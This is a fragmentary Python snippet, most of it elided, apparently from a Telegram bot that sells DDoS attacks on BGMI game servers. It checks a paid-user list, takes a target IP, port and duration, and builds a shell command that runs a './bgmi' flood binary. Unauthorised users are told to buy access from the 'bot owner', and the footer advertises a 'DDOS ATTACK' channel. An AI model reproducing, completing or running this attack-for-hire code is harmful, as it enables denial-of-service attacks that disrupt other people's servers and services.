    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 600:
                ...
                full_command = f"./bgmi {target} {port} {time} 40 1000"
        ...
        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- BOT OWNER")
...
Buy From :- BOT OWNER
Official Channel :- BGMI KA DDOS ATTACK 
'''
